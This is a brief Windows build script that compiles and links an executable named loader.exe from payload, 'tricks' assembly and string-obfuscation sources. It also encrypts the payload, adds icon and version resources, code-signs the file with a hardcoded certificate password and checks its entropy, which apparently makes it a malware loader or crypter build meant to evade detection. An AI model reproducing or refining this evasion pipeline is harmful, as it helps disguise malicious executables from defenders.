nasm -f win64 ../crypto/fast.asm -o fast.o
nasm -f win64 tricks.asm -o tricks.o
gcc -c ../crypto/aes.c -Ofast -nostdlib -w -static
gcc -c payload.c -ffreestanding -nostdlib -static
gcc -c  windows_intern.c -static -ffreestanding
python ./encrypter.py
gcc -c dynamic_strings.c
windres ico.rc -O coff ico.res
windres info.rc -O coff info.res
gcc -o loader.exe loader.c aes.o fast.o tricks.o windows_intern.o dynamic_strings.o ico.res info.res -Wpointer-to-int-cast -nostartfiles -static -lgdiplus -Wl,-e WinMainCRTStartup 
signtool sign /f sign.pfx /p bebra1 /t http://timestamp.digicert.com /fd sha256 loader.exe
python ./entropy.py

del *.o